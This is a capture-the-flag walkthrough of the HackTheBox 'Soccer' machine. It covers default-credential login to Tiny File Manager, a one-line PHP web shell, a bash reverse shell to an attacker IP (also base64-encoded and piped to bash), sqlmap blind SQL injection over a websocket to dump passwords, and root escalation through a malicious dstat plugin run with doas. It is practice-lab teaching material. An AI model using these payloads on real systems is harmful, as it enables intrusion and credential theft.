# HackTheBox - Soccer

## NMAP

```bash
Nmap scan report for 10.10.11.194                                                                                                                                                                                                
Host is up (0.11s latency).                                                                                                                                                                                                      
Not shown: 65532 closed tcp ports (reset)                                                                                                                                                                                        
PORT     STATE SERVICE         VERSION                                                                                                                                                                                           
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                                                      
| ssh-hostkey:                                                                                                                                                                                                                   
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)                                                                                                                                                                                  
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)                                                                                                                                                                                 
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)                                                                                                                                                                               
80/tcp   open  http            nginx 1.18.0 (Ubuntu)                                                                                                                                                                             
|_http-title: Did not follow redirect to http://soccer.htb/                                                                                                                                                                      
| http-methods:                                                                                                                                                                                                                  
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                     
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                      
9091/tcp open  xmltec-xmlmail?                                                                                                                                                                                                   
| fingerprint-strings:                                                                                          
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request                                                                                  
|     Connection: close                                                                                         
|   GetRequest:                                                                                                 
|     HTTP/1.1 404 Not Found                                                                                    
|     Content-Security-Policy: default-src 'none'                                                               
|     X-Content-Type-Options: nosniff                                                                           
|     Content-Type: text/html; charset=utf-8                                                                    
|     Content-Length: 139                                                                                       
|     Date: Mon, 19 Dec 2022 13:32:35 GMT                                                                       
|     Connection: close                                                                                         
|     <!DOCTYPE html>                                                                                           
|     <html lang="en">                                                                                          
|     <head>                                                                                                    
|     <meta charset="utf-8">                                                                                    
|     <title>Error</title>                                                                                      
|     </head>                                                                                                   
|     <body>                                                                                                    
|     <pre>Cannot GET /</pre>                                                                                   
|     </body>                                                                                                   
|     </html>                                                                                                   
|   HTTPOptions, RTSPRequest:                                                                                   
|     HTTP/1.1 404 Not Found                                                                                    
|     Content-Security-Policy: default-src 'none'                                                               
|     X-Content-Type-Options: nosniff              
```


## PORT 80 (HTTP)

Visting the site, we'll be redirected to `soccer.htb`, adding the domain name in `/etc/hosts` file

<img src="https://i.imgur.com/eCQeJX2.png"/>

<img src="https://i.imgur.com/bn8VsWS.png"/>

On adding this domain in hosts file, we'll be able to vist the site

<img src="https://i.imgur.com/dUAqtQR.png"/>

Fuzzing for files and directories using `gobuster`

<img src="https://i.imgur.com/dDLrgre.png"/>

Running with different wordlist, we'll find `/tiny`

<img src="https://i.imgur.com/pHC78FC.png"/>



Try the default creds which are `admin:admin@123`, we'll be able to login

<img src="https://i.imgur.com/P2bf0y3.png"/>

Also the other credentials for low privleged user will work as well which are `user:12345`

<img src="https://i.imgur.com/bTO1mfP.png"/>

At the right bottom, we can see the version as well which is `2.4.3` , we can find the exploit for this which is an authenticated remote code execution through file upload, using the scripts for github or exploit-db won't work because it tries to upload in the tiny's root path which is `/var/www/html/tiny` but the scenario here is different as `tiny` folder is owned by root and the other users have only read access 

<img src="https://i.imgur.com/rEG4tHQ.png"/>

<img src="https://i.imgur.com/qxuTeNW.png"/>

## Foothold

But checking the tiny folder we have a folder named `uploads` in which have full access so we can upload our file there

<img src="https://i.imgur.com/op4Chr9.png"/>

Uploading the php file 

```php
<?php system($_GET['cmd']); ?>
```

<img src="https://i.imgur.com/Aw7rYIZ.png"/>

<img src="https://i.imgur.com/lNZjAUn.png"/>

Getting a reverse shell with a bash base64 encoded payload

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.30/5555 0>&1'

echo 'L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjMwLzU1NTUgMD4mMScK' | base64 -d | bash
```

<img src="https://i.imgur.com/uIWG8rq.png"/>

Checking the nginx config files, we'll see `soc-player.htb` in `/etc/nginx/sites-available/`

<img src="https://i.imgur.com/9sAbV75.png"/>

Which shows that there's another site on port 3000 running locally with the subdomain `soc-player.soccer.htb` , we can port forward using `chisel`

<img src="https://i.imgur.com/msp25ci.png"/>

<img src="https://i.imgur.com/KVph4xY.png"/>

We can try registering for an account

<img src="https://i.imgur.com/2OUlQ7J.png"/>

After signing up, we can login 

<img src="https://i.imgur.com/oTP924Q.png"/>

We can see here an input field but it doesn't reflect anything, on entering with blank field it shows `?????`

<img src="https://i.imgur.com/RVTb5UX.png"/>

The reaons why it does that is 

<img src="https://i.imgur.com/lPdMBJR.png"/>

This code creates a new WebSocket connection to the server at the specified URL `ws://soccer.htb:9091`. When the page finishes loading, it sets up an event listener for the `keypress` event on an input element with the id `id`, and specifies the function `keyOne` to be called when the event occurs. `The keyOne` function stops the event from propagating and, if the key pressed is the Enter key (keyCode 13), it calls the 'sendText' function.

The `sendText` function sends a message to the server over the WebSocket connection. The message is a JSON object with a single field, "id", which contains the value of the input element. If the input element is empty, it calls the 'append' function with the string `????????`.

The `ws.onmessage` function is called when the WebSocket connection receives a message from the server. It calls the 'append' function with the received message as an argument. The `append` function selects the first `p` element in the page and sets its text content to the specified message. It also has commented-out code to set the text color to a random color, but this is not currently being used.


## Privilege Escalation (player)

So here I tried running sqlmap hoping it will find as it's in json and chances are that it maybe vulnerable to blind sqli as there was an article realted to blind sqli in web sockets

https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

Running `sqlmap` against the web socket by providing the JSON post request

```bash
sqlmap -u "ws://soccer.htb:9091" --data='{"id":"jjhhk"}' --batch  --level 2 --risk 2 
```

<img src="https://i.imgur.com/L56v5oX.png"/>

<img src="https://i.imgur.com/I2avFBO.png"/>

Continuing to dump the database, it takes too much time as it's blind so after seeing the database, table and column name and directly tried dumping the passwords

<img src="https://i.imgur.com/PZrzpRc.png"/>

```bash
sqlmap -u "ws://soccer.htb:9091" --data='{"id":"jjhhk"}' --batch  --level 2 --risk 2 -D soccer_db -T accounts -C password --dump
```

<img src="https://i.imgur.com/mu2WSrK.png"/>

<img src="https://i.imgur.com/zjoTQKF.png"/>
Running `sudo -l` to see what privileges we had results nothing but on running `find` command to see what files or folders are owned by `player` groups shows that we have access to `/usr/local/share/dstat`

```bash
find / -group "player" 2>/dev/null | grep -v '/proc' 
```

<img src="https://i.imgur.com/3Q3WnyB.png"/>

`dstat` is a tool that allows getting statistics from the system like seeing the CPU resources memory and etc, having access to this folder we can place external dstat plugins 

<img src="https://i.imgur.com/gh6254G.png"/>

## Privilege Escalation (root)

But issue is we need to run dstat as root if we want those external plugins to be executed as the root user, so running `linpeas` I found `doas` available on this machine

<img src="https://i.imgur.com/R9t3YGv.png"/>

Interstingly there's doas which is an alternate of sudo to execute commands as other users, running this will show that we can run dstat as root user

<img src="https://i.imgur.com/8OLMqaM.png"/>

Creating an external plugin `uwu` by naming it `dstat_uwu.py` and calling it with `dstat --uwu` with doas

```python
import pty
pty.spawn("/bin/bash")
```

```bash
doas /usr/bin/dstat --uwu
```

<img src="https://i.imgur.com/HFuWddn.png"/>



## References

- https://www.ctfiot.com/78939.html
- https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py
- https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
- https://linux.die.net/man/1/dstat
